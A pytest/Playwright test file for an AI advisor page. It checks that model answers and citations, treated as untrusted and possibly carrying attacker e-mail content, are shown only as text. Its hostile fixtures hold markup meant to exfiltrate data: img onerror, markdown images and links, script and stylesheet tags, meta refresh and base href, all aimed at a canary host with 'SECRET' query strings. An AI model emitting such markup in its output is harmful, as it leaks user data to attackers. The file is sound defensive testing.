"""The advisor page in a real browser (M1 PR 11): ask, and see the answer with its
sources and grounding counts, rendered as text.

`POST /api/ask` is PR 12's. Here the browser's request is answered by route
interception with the JSON the plan fixes ("The API contract"), so the page is tested
before its route exists. Everything in that JSON is untrusted: the answer is model
output, and a citation's title, kind and id can come from an attacker's e-mail (threat
model, path 1). A hostile answer and a hostile citation carry an image, inline and
reference-style links, a script, inline handlers and a stylesheet, each aimed at the
canary domain. The page must show them as text and create no element from them. It
must send nothing off its origin and trip no CSP violation, both under the CSP and with
the CSP bypassed, so the page is safe on its own and not only behind the CSP. Controls
show the checks would see it: the same answer parsed as HTML creates an image and a
request with the CSP bypassed, and a violation under it.

No `wait_for_function`: Playwright evaluates its predicate with eval in the page, which
the page's CSP refuses (no 'unsafe-eval'). Waits poll through `expect` or `evaluate`.
"""

from __future__ import annotations

import json
from collections.abc import Iterator

import pytest
from playwright.sync_api import Browser, BrowserContext, Page, Route, expect
from test_smoke import LISTEN_FOR_VIOLATIONS, Recorder, origin

from app.config import branding

CANARY = branding.DOMAINS.canary
FAMILY = branding.DEMO_MANDATE.family
TRACE_ID = "4bf92f3577b34da6a3ce929d0e0e4736"
HEADER_TRACE_ID = "00f067aa0ba902b700f067aa0ba902b7"
QUESTION = f"What do I need to know before the call with {FAMILY}?"
MAX_QUESTION = 2000
# Playwright waits 30 s by default; a missing element should fail a test quickly.
TIMEOUT_MS = 5000
# The page's own elements, plus the list items the script creates. Nothing else may
# exist after an answer: an allowlist, so a new kind of element is caught too.
PAGE_ELEMENTS = frozenset(
    {
        "html", "head", "meta", "title", "link", "script", "body", "main", "header",
        "h1", "h2", "p", "form", "label", "textarea", "button", "section", "div",
        "ol", "dl", "dt", "dd", "span", "li",
    }
)  # fmt: skip
STRUCTURE = """() => ({
  tags: [...new Set([...document.querySelectorAll("*")].map((e) => e.localName))].sort(),
  scripts: document.querySelectorAll("script").length,
  links: document.querySelectorAll("link").length,
  answer: [...document.getElementById("answer").childNodes].map((n) => n.nodeType),
  items: [...document.querySelectorAll("#citations li")].map((li) =>
    [...li.childNodes].map((n) => n.localName + ":" + [...n.childNodes].map((c) => c.nodeType))
  ),
})"""
SETTLE = "() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)))"
ANSWER_LABEL = (
    "Model output. It can quote e-mails and documents word for word; nothing in it is a link."
)
GROUNDING_NOTE = (
    "Found in the sources means the figure appears in a document this answer retrieved,"
    " not that it is correct."
)
NO_ANSWER = "The request failed: no answer from the server."

HOSTILE = (
    f'<img src="https://{CANARY}/i.png?d=SECRET" onerror="window.pwned=1">'
    f"![x](https://{CANARY}/m.png?d=SECRET) [y](https://{CANARY}/l?d=SECRET)"
    # Only here, never in the answer the controls inject: these two would act on insertion.
    f'<meta http-equiv="refresh" content="0;url=https://{CANARY}/r"><base href="https://{CANARY}/">'
)
HOSTILE_ANSWER = (
    f"Summary for {FAMILY} [source: doc-kyc-0001].\n"
    f'<img src="https://{CANARY}/p.png?d=SECRET" onerror="window.pwned=1">\n'
    f"![chart](https://{CANARY}/c.png?d=SECRET)\n"
    f"See [the report][1] and [this page](https://{CANARY}/l?d=SECRET).\n"
    f'<a href="https://{CANARY}/a?d=SECRET">open</a> <svg onload="window.pwned=2"></svg>\n'
    f'<video poster="https://{CANARY}/v.png"></video><input type="image" src="https://{CANARY}/b">\n'
    f'<script src="https://{CANARY}/s.js"></script><link rel="stylesheet" href="https://{CANARY}/c">\n'
    "<script>window.pwned = 3</script>\n"
    f"<style>body {{ background: url(https://{CANARY}/s.png?d=SECRET) }}</style>\n"
    f"https://{CANARY}/bare?d=SECRET\n"
    "\n"
    f"[1]: https://{CANARY}/r?d=SECRET\n"
)
HOSTILE_TITLE = f"Re: statement {HOSTILE}"
HOSTILE_RECORD = f"rt-mail-0001{HOSTILE}"
HOSTILE_KIND = f"document{HOSTILE}"


def answer(**changes: object) -> dict[str, object]:
    """A 200 body as the plan's contract fixes it."""
    body: dict[str, object] = {
        "answer": f"{FAMILY}: two figures, one of them unmatched [source: doc-kyc-0001].",
        "citations": [
            {"record_id": "doc-kyc-0001", "title": "KYC profile", "kind": "document"},
            {"record_id": "product-fund", "title": "Fund sheet", "kind": "product_sheet"},
        ],
        "grounding": {"figures": 3, "unmatched": 1, "unknown_citations": 0},
        "proposals": [],
        "usage": {"input_tokens": 1234, "output_tokens": 567},
        "cost_usd": 0.0123,
        "stop": "end_turn",
        "trace_id": TRACE_ID,
    }
    return body | changes


class Api:
    """Answers POST /api/ask in the browser, and keeps what the page sent."""

    def __init__(self, context: BrowserContext, base: str) -> None:
        self.requests: list[dict[str, object]] = []
        self.status = 200
        self.body: object = answer()
        self.trace_header: str | None = HEADER_TRACE_ID
        context.route(base + "/api/ask", self._handle)

    def _handle(self, route: Route) -> None:
        request = route.request
        self.requests.append(
            {
                "method": request.method,
                "headers": request.all_headers(),
                "body": request.post_data,
            }
        )
        payload = self.body if isinstance(self.body, str) else json.dumps(self.body)
        headers = {"content-type": "application/json"}
        if self.trace_header is not None:
            headers["x-trace-id"] = self.trace_header
        route.fulfill(status=self.status, headers=headers, body=payload)

    def bodies(self) -> list[object]:
        return [json.loads(str(sent["body"])) for sent in self.requests]


def _context(browser: Browser, *, bypass_csp: bool) -> BrowserContext:
    context = browser.new_context(service_workers="block", bypass_csp=bypass_csp)
    context.set_default_timeout(TIMEOUT_MS)
    expect.set_options(timeout=TIMEOUT_MS)
    context.add_init_script(LISTEN_FOR_VIOLATIONS)
    return context


@pytest.fixture
def context(browser: Browser) -> Iterator[BrowserContext]:
    context = _context(browser, bypass_csp=False)
    yield context
    context.close()


@pytest.fixture
def context_without_csp(browser: Browser) -> Iterator[BrowserContext]:
    context = _context(browser, bypass_csp=True)
    yield context
    context.close()


def ask(page: Page, question: str = QUESTION) -> None:
    page.fill("#question", question)
    page.click("#ask button[type=submit]")


def set_question(page: Page, value: str) -> None:
    # maxlength stops typing, not a value set by script.
    page.evaluate("(v) => { document.getElementById('question').value = v; }", value)


def shown(page: Page) -> None:
    page.wait_for_selector("#result:not([hidden])")


def text(page: Page, selector: str) -> str:
    return page.locator(selector).text_content() or ""


def settle(page: Page) -> None:
    """Two animation frames: the page has handled every response that has arrived."""
    page.evaluate(SETTLE)


def opened(page: Page, url: str) -> None:
    page.goto(url + "/")


# --- hostile output -----------------------------------------------------------------


@pytest.mark.parametrize("csp", ["with the CSP", "with the CSP bypassed"])
def test_hostile_answer_is_shown_as_text(
    request: pytest.FixtureRequest, app_url: str, csp: str
) -> None:
    name = "context" if csp == "with the CSP" else "context_without_csp"
    context: BrowserContext = request.getfixturevalue(name)
    recorder = Recorder(context)
    api = Api(context, app_url)
    api.body = answer(
        answer=HOSTILE_ANSWER,
        citations=[
            {"record_id": HOSTILE_RECORD, "title": HOSTILE_TITLE, "kind": HOSTILE_KIND},
            {"record_id": "doc-kyc-0001", "title": "KYC profile", "kind": "document"},
        ],
    )
    page = context.new_page()
    opened(page, app_url)
    before = page.evaluate(STRUCTURE)
    ask(page)
    shown(page)

    assert text(page, "#answer") == HOSTILE_ANSWER
    first = page.locator("#citations li").nth(0)
    assert first.locator(".title").text_content() == HOSTILE_TITLE
    assert first.locator(".record").text_content() == HOSTILE_RECORD
    assert first.locator(".kind").text_content() == HOSTILE_KIND

    after = page.evaluate(STRUCTURE)
    assert set(after["tags"]) <= PAGE_ELEMENTS, after["tags"]
    # The script's own list items and spans; the static page has neither.
    assert set(after["tags"]) - set(before["tags"]) == {"li", "span"}, after["tags"]
    assert (after["scripts"], after["links"]) == (before["scripts"], before["links"]) == (1, 1)
    assert after["answer"] == [3], after["answer"]  # one text node
    assert after["items"] == [["span:3", "span:3", "span:3"]] * 2, after["items"]

    assert page.evaluate("window.pwned") is None
    settle(page)
    page.wait_for_timeout(500)  # a late image, style or navigation would show up here
    assert page.url == app_url + "/"
    assert page.evaluate("window.__violations") == []
    assert len(api.requests) == 1, api.requests  # non-vacuity: the page asked
    foreign = [url for url in recorder.requests if origin(url) != origin(app_url)]
    assert foreign == [], foreign
    assert not [url for url in recorder.requests if CANARY in url], recorder.requests
    assert recorder.websockets == [], recorder.websockets


@pytest.mark.parametrize("kind", ["__proto__", "constructor", "toString", "hasOwnProperty"])
def test_an_unknown_kind_is_shown_as_written(
    context: BrowserContext, app_url: str, kind: str
) -> None:
    # The kind table is read only for its own keys, never for inherited ones.
    api = Api(context, app_url)
    api.body = answer(citations=[{"record_id": "doc-1", "title": "A", "kind": kind}])
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    assert page.locator("#citations li .kind").text_content() == kind


def test_the_answer_is_labelled_as_model_output(context: BrowserContext, app_url: str) -> None:
    # An answer can imitate the page's own sections; the label and its box say whose
    # text it is (review sec-1).
    Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    assert text(page, "#answer-label") == ANSWER_LABEL
    assert page.locator("#answer-label").is_visible()
    assert text(page, "#grounding-note") == GROUNDING_NOTE


# --- the request --------------------------------------------------------------------


def test_request_follows_the_contract(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    ask(page, f"  {QUESTION}\n")
    shown(page)
    [sent] = api.requests
    assert sent["method"] == "POST"
    assert api.bodies() == [{"question": QUESTION}]
    headers = sent["headers"]
    assert isinstance(headers, dict)
    assert headers.get("content-type") == "application/json", headers
    # The Origin check of every non-GET route (ADR 0009): fetch in cors mode sends the
    # real origin even under Referrer-Policy: no-referrer, where a form sends "null".
    assert headers.get("origin") == app_url, headers


@pytest.mark.parametrize(
    ("value", "sent"),
    [
        ("x" * MAX_QUESTION, "x" * MAX_QUESTION),
        ("  " + "y" * MAX_QUESTION + "\n", "y" * MAX_QUESTION),
        ("z", "z"),
    ],
    ids=["2000", "2000 after trimming", "1"],
)
def test_question_length_bounds(
    context: BrowserContext, app_url: str, value: str, sent: str
) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    set_question(page, value)
    page.click("#ask button[type=submit]")
    shown(page)
    assert api.bodies() == [{"question": sent}]


@pytest.mark.parametrize(
    ("value", "message"),
    [
        ("   \n ", "Ask a question first."),
        ("x" * (MAX_QUESTION + 1), "The question is too long: at most 2000 characters."),
    ],
    ids=["blank", "2001"],
)
def test_an_invalid_question_is_not_sent(
    context: BrowserContext, app_url: str, value: str, message: str
) -> None:
    # The next valid question is the one request: nothing was in flight before it.
    api = Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    set_question(page, value)
    page.click("#ask button[type=submit]")
    expect(page.locator("#status")).to_have_text(message)
    ask(page, "valid")
    shown(page)
    assert api.bodies() == [{"question": "valid"}]


@pytest.mark.parametrize("keys", ["Control+Enter", "Meta+Enter"])
def test_the_keyboard_asks(context: BrowserContext, app_url: str, keys: str) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    page.fill("#question", QUESTION)
    page.press("#question", keys)
    shown(page)
    assert api.bodies() == [{"question": QUESTION}]


def test_plain_enter_does_not_ask(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    page.fill("#question", "line one")
    page.press("#question", "Enter")
    page.locator("#question").press_sequentially("line two")
    page.click("#ask button[type=submit]")
    shown(page)
    assert api.bodies() == [{"question": "line one\nline two"}]


# --- what the page shows ------------------------------------------------------------


def test_citations_show_their_titles(context: BrowserContext, app_url: str) -> None:
    Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    items = page.locator("#citations li")
    assert items.count() == 2
    first, second = items.nth(0).text_content() or "", items.nth(1).text_content() or ""
    assert "KYC profile" in first and "doc-kyc-0001" in first, first
    assert "Fund sheet" in second and "product sheet" in second, second


def test_grounding_counts_never_say_verified(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    api.body = answer(grounding={"figures": 3, "unmatched": 1, "unknown_citations": 2})
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    assert text(page, "#figures") == "2 of 3 figures found in the sources."
    assert text(page, "#unknown") == "2 cited ids are not among the sources."
    assert "verif" not in (page.locator("body").text_content() or "").lower()


@pytest.mark.parametrize(
    ("grounding", "figures", "unknown"),
    [
        ({"figures": 0, "unmatched": 0, "unknown_citations": 0}, "The answer has no figures.", ""),
        (
            {"figures": 1, "unmatched": 0, "unknown_citations": 1},
            "1 of 1 figure found in the sources.",
            "1 cited id is not among the sources.",
        ),
    ],
    ids=["none", "singular"],
)
def test_grounding_edge_counts(
    context: BrowserContext, app_url: str, grounding: dict, figures: str, unknown: str
) -> None:
    api = Api(context, app_url)
    api.body = answer(grounding=grounding)
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    assert text(page, "#figures") == figures
    assert text(page, "#unknown") == unknown


def test_trace_id_cost_and_tokens(context: BrowserContext, app_url: str) -> None:
    Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    assert text(page, "#trace") == TRACE_ID
    assert text(page, "#cost") == "USD 0.0123"
    assert text(page, "#tokens") == "1234 in, 567 out"
    assert page.locator("#stop").is_hidden()


@pytest.mark.parametrize("cost", ["0.0123", "0", 0, "0.00"])
def test_cost_forms(context: BrowserContext, app_url: str, cost: object) -> None:
    # PR 12 may serialise the loop's Decimal as a JSON string.
    api = Api(context, app_url)
    api.body = answer(cost_usd=cost)
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    assert text(page, "#cost") == f"USD {float(cost):.4f}"


@pytest.mark.parametrize(
    ("stop", "reason"),
    [
        ("refusal", "The model declined to answer."),
        ("budget", "Stopped early: the token budget for this question ran out."),
        ("max_turns", "Stopped early: the turn limit for this question was reached."),
    ],
)
def test_stop_reason_is_stated(
    context: BrowserContext, app_url: str, stop: str, reason: str
) -> None:
    api = Api(context, app_url)
    api.body = answer(stop=stop, answer="")
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    assert text(page, "#stop") == reason
    assert page.locator("#stop").is_visible()


# --- failures -----------------------------------------------------------------------


@pytest.mark.parametrize(
    ("status", "message"),
    [
        (401, "Not signed in."),
        (403, "The request was refused."),
        (422, "The question was not accepted: it needs 1 to 2000 characters."),
        (429, "Too many questions in a short time. Wait a moment, then ask again."),
        (503, "The service is unavailable."),
        (500, "The request failed (HTTP 500)."),
    ],
)
def test_failures_are_stated(
    context: BrowserContext, app_url: str, status: int, message: str
) -> None:
    api = Api(context, app_url)
    api.status = status
    api.body = {"detail": f"<img src=https://{CANARY}/e.png>"}
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    expect(page.locator("#status")).to_have_text(f"{message} Trace id: {HEADER_TRACE_ID}")
    assert page.locator("#result").is_hidden()
    assert "detail" not in (page.locator("body").text_content() or "")
    assert page.evaluate("window.__violations") == []


@pytest.mark.parametrize(
    "header",
    [None, "<img>", HEADER_TRACE_ID + "x", HEADER_TRACE_ID.upper(), HEADER_TRACE_ID[:-1]],
    ids=["missing", "markup", "trailing", "upper case", "short"],
)
def test_a_bad_trace_header_is_not_shown(
    context: BrowserContext, app_url: str, header: str | None
) -> None:
    api = Api(context, app_url)
    api.status = 503
    api.trace_header = header
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    expect(page.locator("#status")).to_have_text("The service is unavailable.")


def test_a_network_failure_is_stated(context: BrowserContext, app_url: str) -> None:
    context.route(app_url + "/api/ask", lambda route: route.abort())
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    expect(page.locator("#status")).to_have_text(NO_ANSWER)
    assert page.locator("#ask button").is_enabled()


def test_a_redirect_is_not_followed(context_without_csp: BrowserContext, app_url: str) -> None:
    # With the CSP bypassed, so connect-src cannot be what stops it.
    recorder = Recorder(context_without_csp)
    context_without_csp.route(
        app_url + "/api/ask",
        lambda route: route.fulfill(
            status=302, headers={"location": f"https://{CANARY}/next?d=SECRET"}
        ),
    )
    page = context_without_csp.new_page()
    opened(page, app_url)
    ask(page)
    expect(page.locator("#status")).to_have_text(NO_ANSWER)
    settle(page)
    assert not [url for url in recorder.requests if CANARY in url], recorder.requests


def broken(**changes: object) -> str:
    return json.dumps(answer(**changes))


def nested(field: str, key: str, value: object) -> str:
    base = answer()
    inner = dict(base[field])  # type: ignore[call-overload]
    inner[key] = value
    return json.dumps(base | {field: inner})


def citation(key: str, value: object) -> str:
    item: dict[str, object] = {"record_id": "doc-1", "title": "A", "kind": "document"}
    item[key] = value
    return broken(citations=[item])


def without(key: str) -> str:
    base = answer()
    del base[key]
    return json.dumps(base)


# One row per clause of the page's check (review test-4): each breaks one field only.
MALFORMED = [
    pytest.param("not json", id="not json"),
    pytest.param("null", id="null"),
    pytest.param("[]", id="array"),
    pytest.param("3", id="number"),
    pytest.param(broken(answer=["a list"]), id="answer not a string"),
    pytest.param(without("answer"), id="answer missing"),
    pytest.param(broken(citations={"0": {}}), id="citations not an array"),
    pytest.param(broken(citations=[None]), id="citation null"),
    pytest.param(citation("record_id", 1), id="record_id not a string"),
    pytest.param(citation("title", 1), id="title not a string"),
    pytest.param(citation("kind", None), id="kind not a string"),
    pytest.param(broken(grounding=None), id="grounding null"),
    pytest.param(broken(grounding=[1, 0, 0]), id="grounding an array"),
    pytest.param(nested("grounding", "figures", -1), id="figures negative"),
    pytest.param(nested("grounding", "figures", "3"), id="figures a string"),
    pytest.param(nested("grounding", "unmatched", 0.5), id="unmatched fractional"),
    pytest.param(nested("grounding", "unmatched", 4), id="unmatched above figures"),
    pytest.param(nested("grounding", "unknown_citations", -1), id="unknown negative"),
    pytest.param(nested("grounding", "unknown_citations", "1"), id="unknown a string"),
    pytest.param(broken(usage=None), id="usage null"),
    pytest.param(nested("usage", "input_tokens", 1.5), id="input tokens fractional"),
    pytest.param(nested("usage", "output_tokens", -1), id="output tokens negative"),
    pytest.param(nested("usage", "output_tokens", 2**53), id="output tokens unsafe"),
    pytest.param(broken(cost_usd=-0.01), id="cost negative"),
    pytest.param(broken(cost_usd="-0.01"), id="cost a negative string"),
    pytest.param(broken(cost_usd="1e3"), id="cost in exponent form"),
    pytest.param(broken(cost_usd="0.1abc"), id="cost with trailing text"),
    pytest.param(broken(cost_usd=" 0.1"), id="cost with leading space"),
    pytest.param(broken(cost_usd=None), id="cost null"),
    pytest.param(broken(stop="__proto__"), id="stop inherited"),
    pytest.param(broken(stop="toString"), id="stop inherited method"),
    pytest.param(broken(stop="end"), id="stop unknown"),
    pytest.param(broken(stop=1), id="stop not a string"),
    pytest.param(broken(trace_id="<b>x</b>"), id="trace id markup"),
    pytest.param(broken(trace_id=TRACE_ID + "<img>"), id="trace id with trailing text"),
    pytest.param(broken(trace_id="x" + TRACE_ID), id="trace id with leading text"),
    pytest.param(broken(trace_id=TRACE_ID.upper()), id="trace id upper case"),
    pytest.param(without("trace_id"), id="trace id missing"),
]


@pytest.mark.parametrize("body", MALFORMED)
def test_unexpected_response_renders_nothing(
    context: BrowserContext, app_url: str, body: str
) -> None:
    api = Api(context, app_url)
    api.body = body
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    expect(page.locator("#status")).to_have_text(
        f"Unexpected response. Trace id: {HEADER_TRACE_ID}"
    )
    assert page.locator("#result").is_hidden()
    assert text(page, "#answer") == ""
    assert page.locator("#citations li").count() == 0


def test_a_new_question_clears_the_last_answer(context: BrowserContext, app_url: str) -> None:
    api = Api(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    ask(page)
    shown(page)
    api.status = 503
    api.body = {"detail": "unavailable"}
    ask(page)
    expect(page.locator("#status")).to_have_text(
        f"The service is unavailable. Trace id: {HEADER_TRACE_ID}"
    )
    assert page.locator("#result").is_hidden()
    assert text(page, "#answer") == ""
    assert page.locator("#citations li").count() == 0
    for selector in ("#figures", "#unknown", "#trace", "#cost", "#tokens", "#stop"):
        assert text(page, selector) == "", selector


# --- more than one question ---------------------------------------------------------


class Held:
    """Keeps every POST /api/ask unanswered until the test answers it."""

    def __init__(self, context: BrowserContext, base: str) -> None:
        self.routes: list[Route] = []
        # A lambda: Playwright cannot wrap a builtin method such as list.append.
        context.route(base + "/api/ask", lambda route: self.routes.append(route))

    def wait_for(self, page: Page, count: int) -> None:
        for _ in range(100):
            if len(self.routes) >= count:
                return
            page.wait_for_timeout(50)
        pytest.fail(f"{len(self.routes)} requests held, expected {count}")

    @staticmethod
    def answer(page: Page, route: Route, late: str, body: dict[str, object]) -> None:
        """Answers one held request and waits until the page has handled it."""
        if late == "network error":
            with page.expect_event("requestfailed"):
                route.abort()
        else:
            status = 500 if late == "500" else 200
            with page.expect_event("requestfinished"):
                route.fulfill(status=status, content_type="application/json", body=json.dumps(body))
        settle(page)


def two_questions(page: Page, held: Held) -> tuple[Route, Route]:
    ask(page, "first")
    held.wait_for(page, 1)
    page.fill("#question", "second")
    page.press("#question", "Control+Enter")
    held.wait_for(page, 2)
    first, second = held.routes
    assert json.loads(first.request.post_data or "") == {"question": "first"}
    assert json.loads(second.request.post_data or "") == {"question": "second"}
    return first, second


@pytest.mark.parametrize("late", ["answer", "500", "network error"])
def test_a_late_reply_to_an_older_question_is_dropped(
    context: BrowserContext, app_url: str, late: str
) -> None:
    held = Held(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    first, second = two_questions(page, held)
    Held.answer(page, second, "answer", answer(answer="the second answer"))
    shown(page)
    Held.answer(page, first, late, answer(answer="the first answer"))
    assert text(page, "#answer") == "the second answer"
    assert text(page, "#status") == ""
    assert page.locator("#result").is_visible()
    assert page.locator("#ask button").is_enabled()


@pytest.mark.parametrize("late", ["answer", "500", "network error"])
def test_an_older_reply_before_the_newer_one_changes_nothing(
    context: BrowserContext, app_url: str, late: str
) -> None:
    held = Held(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    first, second = two_questions(page, held)
    Held.answer(page, first, late, answer(answer="the first answer"))
    assert page.locator("#result").is_hidden()
    assert text(page, "#answer") == ""
    assert text(page, "#status") == ""
    assert page.locator("#ask button").is_disabled(), "the newer question is still pending"
    Held.answer(page, second, "answer", answer(answer="the second answer"))
    shown(page)
    assert text(page, "#answer") == "the second answer"
    assert page.locator("#ask button").is_enabled()


def test_a_blank_question_drops_the_pending_one(context: BrowserContext, app_url: str) -> None:
    held = Held(context, app_url)
    page = context.new_page()
    opened(page, app_url)
    ask(page, "first")
    held.wait_for(page, 1)
    page.fill("#question", " ")
    page.press("#question", "Control+Enter")
    expect(page.locator("#status")).to_have_text("Ask a question first.")
    Held.answer(page, held.routes[0], "answer", answer(answer="the first answer"))
    assert page.locator("#result").is_hidden()
    assert text(page, "#status") == "Ask a question first."
    assert page.locator("#ask button").is_enabled()
    assert len(held.routes) == 1


# --- controls -----------------------------------------------------------------------


def test_control_html_rendering_is_seen(context_without_csp: BrowserContext, app_url: str) -> None:
    # With the CSP bypassed, the hostile answer parsed as HTML creates markup, and the
    # browser requests the canary host (and fails: no name resolves).
    recorder = Recorder(context_without_csp)
    page = context_without_csp.new_page()
    opened(page, app_url)
    with page.expect_event("requestfailed"):
        page.evaluate("(a) => { document.getElementById('answer').innerHTML = a; }", HOSTILE_ANSWER)
    after = page.evaluate(STRUCTURE)
    assert not set(after["tags"]) <= PAGE_ELEMENTS, after["tags"]
    assert [url for url in recorder.requests if CANARY in url], recorder.requests


def test_control_csp_reports_an_injected_image(context: BrowserContext, app_url: str) -> None:
    # Under the CSP the same image is blocked and reported: the violation check has teeth.
    page = context.new_page()
    opened(page, app_url)
    page.evaluate("(a) => { document.getElementById('answer').innerHTML = a; }", HOSTILE_ANSWER)
    for _ in range(100):
        if "img-src" in page.evaluate("window.__violations"):
            break
        page.wait_for_timeout(50)
    assert "img-src" in page.evaluate("window.__violations"), page.evaluate("window.__violations")
